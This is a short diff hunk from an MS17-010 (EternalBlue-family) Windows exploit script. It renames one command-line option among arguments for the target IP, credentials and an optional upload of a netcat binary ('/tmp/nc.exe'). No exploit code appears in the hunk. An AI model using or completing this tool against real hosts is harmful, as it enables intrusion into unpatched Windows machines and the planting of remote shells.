@@ -1141,7 +1141,7 @@ Tested on:
     parser = argparse.ArgumentParser(add_help=True, description='MS17-010 exploit for Windows 2000 and later')
     try:
         parser.add_argument('-target', action='store', help='IP address the target')
-        parser.add_argument('-pipe_name', default='samr', action='store', help='Pipe name to bind to (e.g. browser, spoolss, netlogon, lsarpc, samr')
+        parser.add_argument('-pipename', default='samr', action='store', help='Pipe name to bind to (e.g. browser, spoolss, netlogon, lsarpc, samr')
         parser.add_argument('-username', default='', action='store', help='Username to authenticate (optional)')
         parser.add_argument('-password', default='', action='store', help='Password to authenticate (optional)')
         parser.add_argument('-uploadsrc', default='', action='store', help='Upload source file /tmp/nc.exe (optional)')
